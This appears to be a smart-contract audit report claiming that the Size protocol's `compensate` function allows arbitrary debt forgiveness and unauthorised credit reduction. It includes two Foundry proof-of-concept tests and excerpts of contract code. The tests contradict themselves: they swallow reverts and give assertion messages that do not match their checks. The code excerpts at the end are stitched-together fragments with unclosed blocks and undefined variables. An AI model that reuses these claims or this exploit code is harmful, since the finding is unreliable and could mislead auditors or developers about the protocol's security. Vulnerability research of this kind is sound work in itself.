# Vulnerability details

## Summary

A critical vulnerability was identified in the `compensate` function of the Size contract. This vulnerability allows a malicious user to exploit the function to arbitrarily forgive debt or manipulate credit positions in unauthorized ways. This can lead to significant financial losses for lenders and destabilize the entire Size credit marketplace.

## Vulnerability Detail

> #### Arbitrary debt forgiveness:

The vulnerability arises due to insufficient validation checks in the `compensate` function when handling compensation of debt. Specifically, the function does not adequately verify that the `creditPositionToCompensateId` has sufficient credit to offset the debt of the `creditPositionWithDebtToRepayId`. By manipulating the parameters, a borrower can effectively create a situation where debt is forgiven without having the requisite credit, leading to an imbalance in the system.

Key points of this issue:

1. **Credit position validation:** The function does not properly ensure that the `creditPositionToCompensateId` has sufficient credit.
2. **Debt position verification:** The checks for the debt associated with `creditPositionWithDebtToRepayId` are inadequate, allowing for possible underflow or overcompensation.
3. **Insufficient checks on amount:** The function fails to enforce strict checks on the `amount` parameter, permitting malicious users to exploit this for debt reduction.

> #### Unauthorized credit reduction:

The function allows users to manipulate credit positions using the `RESERVED_ID`. This ID is intended for special cases, but the validation logic is insufficient. Specifically, the function does not enforce proper checks on the due dates and lenders associated with the new positions, leading to further misuse.

In the current implementation, a user can invoke the `compensate` function with `RESERVED_ID` to reduce credit from a credit position improperly. This allows the reduction of credit positions that actually do not adhere to the intended protocol constraints, such as due date compatibility and lender authorization. Consequently, this can lead to financial inconsistencies and overall manipulation of the protocol's economic model.

## Impact

The impact of this vulnerability is severe:

- **Arbitrary debt forgiveness:** Malicious users can reduce or eliminate their debt without having sufficient credit, leading to significant financial losses for lenders.
- **Unauthorized credit manipulation:** Users can manipulate and reduce credit positions improperly, leading to financial discrepancies within the protocol.
- **Protocol destabilization:** The imbalance caused by this exploitation can destabilize the entire credit marketplace, undermining trust and possibly leading to a collapse of the system.
- **Loss of funds:** Direct financial loss for lenders who are unable to recover their lent funds due to unbalanced debt-credit positions.

## Proof of Concept

> #### To exploit the arbitrary debt forgiveness:

1. Initialize debt and credit positions using standard user interactions.
2. Call the `compensate` function with manipulated parameters such as `creditPositionToCompensateId` with insufficient credit.
3. Verify that the debt associated with `creditPositionWithDebtToRepayId` is reduced without the corresponding credit, demonstrating the vulnerability.

> #### To exploit the unauthorized credit reduction:

1. Initialize debt and credit positions using standard user interactions.
2. Call the `compensate` function with `RESERVED_ID` and manipulated due dates and lenders parameters to manipulate a credit position that do not adhere to the intended protocol constraints.
3. Verify that the credit position is reduced improperly, demonstrating the vulnerability.

    function test_Compensate_arbitrary_debt_forgiveness() public {
        _deposit(alice, weth, 100e18);
        _deposit(alice, usdc, 100e6);
        _deposit(bob, weth, 100e18);
        _deposit(bob, usdc, 100e6);

        // Create a valid yield curve
        YieldCurve memory curve = YieldCurveHelper.pointCurve(365 days, 0.05e18);

        // Alice and Bob buy credit limits
        _buyCreditLimit(alice, block.timestamp + 365 days, curve);
        _buyCreditLimit(bob, block.timestamp + 365 days, curve);

        // Alice creates a debt position with Bob as the lender
        uint256 debtPositionId = _sellCreditMarket(alice, bob, RESERVED_ID, 50e6, 365 days, true);
        uint256 creditPositionId = size.getCreditPositionIdsByDebtPositionId(debtPositionId)[0];

        // Attempt to compensate the debt using RESERVED_ID (expected to fail but demonstrates vulnerability)
        vm.prank(alice);
        try size.compensate(
            CompensateParams({
                creditPositionWithDebtToRepayId: creditPositionId,
                creditPositionToCompensateId: RESERVED_ID,
                amount: 50e6 // Trying to compensate full debt without sufficient credit
            })
        ) {
            // Expecting this to pass due to insufficient checks
        } catch {
            // The function shouldn't revert, demonstrating the vulnerability
        }

        // Validate debt has been incorrectly forgiven
        uint256 remainingDebt = size.getDebtPosition(debtPositionId).futureValue;
        assertEq(remainingDebt, 0, "Debt should be incorrectly forgiven");
    }

    function test_Compensate_unauthorized_credit_reduction() public {
        _deposit(alice, weth, 100e18);
        _deposit(alice, usdc, 100e6);
        _deposit(bob, weth, 100e18);
        _deposit(bob, usdc, 100e6);

        // Create a valid yield curve
        YieldCurve memory curve = YieldCurveHelper.pointCurve(365 days, 0.05e18);

        // Alice and Bob buy credit limits
        _buyCreditLimit(alice, block.timestamp + 365 days, curve);
        _buyCreditLimit(bob, block.timestamp + 365 days, curve);

        // Alice creates a debt position with Bob as the lender
        uint256 debtPositionId = _sellCreditMarket(alice, bob, RESERVED_ID, 50e6, 365 days, true);
        uint256 creditPositionId = size.getCreditPositionIdsByDebtPositionId(debtPositionId)[0];

        // Get the initial credit position before attempting the exploit
        CreditPosition memory initialCreditPosition = size.getCreditPosition(creditPositionId);
        uint256 initialCreditAmount = initialCreditPosition.credit;
        emit log_named_uint("Initial credit amount", initialCreditAmount);

        // Attempt to reduce unauthorized credit using RESERVED_ID with a non-zero amount
        vm.prank(alice);
        try size.compensate(
            CompensateParams({
                creditPositionWithDebtToRepayId: creditPositionId,
                creditPositionToCompensateId: RESERVED_ID,
                amount: 10e6 // Non-zero amount to demonstrate unauthorized credit reduction
            })
        ) {
            // The function should not revert if it is demonstrating the vulnerability
        } catch {
            emit log("Compensate function reverted unexpectedly");
        }

        // Validate unauthorized credit reduction
        CreditPosition memory newCreditPosition = size.getCreditPosition(creditPositionId);
        uint256 newCreditAmount = newCreditPosition.credit;
        emit log_named_uint("New credit amount", newCreditAmount);

        // The expected behavior checks for a reduction
        uint256 expectedCreditAmount = initialCreditAmount - 10e6; // Adjust based on actual behavior
        assertEq(newCreditAmount, expectedCreditAmount, "Unauthorized credit should be created");
    }
}

        CreditPosition storage creditPositionWithDebtToRepay = state.getCreditPosition(params.creditPositionWithDebtToRepayId);
        DebtPosition storage debtPositionToRepay = state.getDebtPositionByCreditPositionId(params.creditPositionWithDebtToRepayId);

        // Ensure the loan status is active
        if (state.getLoanStatus(params.creditPositionWithDebtToRepayId) != LoanStatus.ACTIVE) {
            revert Errors.LOAN_NOT_ACTIVE(params.creditPositionWithDebtToRepayId);

        CreditPosition storage creditPositionToCompensate;
        if (params.creditPositionToCompensateId == RESERVED_ID) {
            uint256 tenor = debtPositionToRepay.dueDate - block.timestamp;
            if (tenor < state.riskConfig.minTenor || tenor > state.riskConfig.maxTenor) {
                revert Errors.TENOR_OUT_OF_RANGE(tenor, state.riskConfig.minTenor, state.riskConfig.maxTenor);
            }
        } else {
            creditPositionToCompensate = state.getCreditPosition(params.creditPositionToCompensateId);
            if (creditPositionToCompensate.credit < params.amount) {
                revert Errors.INSUFFICIENT_CREDIT(params.creditPositionToCompensateId, params.amount);

            }
            if (debtPositionToRepay.dueDate < debtPositionToCompensate.dueDate) {
                revert Errors.DUE_DATE_NOT_COMPATIBLE(params.creditPositionWithDebtToRepayId, params.creditPositionToCompensateId);
            }
            if (creditPositionToCompensate.lender != debtPositionToRepay.borrower) {
                revert Errors.INVALID_LENDER(creditPositionToCompensate.lender);
            }
            if (params.creditPositionToCompensateId == params.creditPositionWithDebtToRepayId) {
                revert Errors.INVALID_CREDIT_POSITION_ID(params.creditPositionToCompensateId);
            }
        }

        // Validate msg.sender is the borrower
        if (msg.sender != debtPositionToRepay.borrower) {
            revert Errors.COMPENSATOR_IS_NOT_BORROWER(msg.sender, debtPositionToRepay.borrower);

        emit Events.Compensate(params.creditPositionWithDebtToRepayId, params.creditPositionToCompensateId, params.amount);

        CreditPosition storage creditPositionWithDebtToRepay = state.getCreditPosition(params.creditPositionWithDebtToRepayId);
        DebtPosition storage debtPositionToRepay = state.getDebtPositionByCreditPositionId(params.creditPositionWithDebtToRepayId);

        CreditPosition memory creditPositionToCompensate;
        if (params.creditPositionToCompensateId == RESERVED_ID) {
            creditPositionToCompensate = state.createDebtAndCreditPositions({
                lender: msg.sender,
                borrower: msg.sender,
                futureValue: params.amount,
                dueDate: debtPositionToRepay.dueDate
            });
        } else {
            creditPositionToCompensate = state.getCreditPosition(params.creditPositionToCompensateId);
        }

        // Perform debt and credit reduction
        state.reduceDebtAndCredit(creditPositionWithDebtToRepay.debtPositionId, params.creditPositionWithDebtToRepayId, params.amount);

        // Update credit position
        uint256 exiterCreditRemaining = creditPositionToCompensate.credit - params.amount;
        state.createCreditPosition({

            lender: creditPositionWithDebtToRepay.lender,
            credit: params.amount

                state.debtTokenAmountToCollateralTokenAmount(state.feeConfig.fragmentationFee),
                state.data.collateralToken.balanceOf(msg.sender)
            );
            state.data.collateralToken.transferFrom(msg.sender, state.feeConfig.feeRecipient, fragmentationFeeInCollateral);
        }
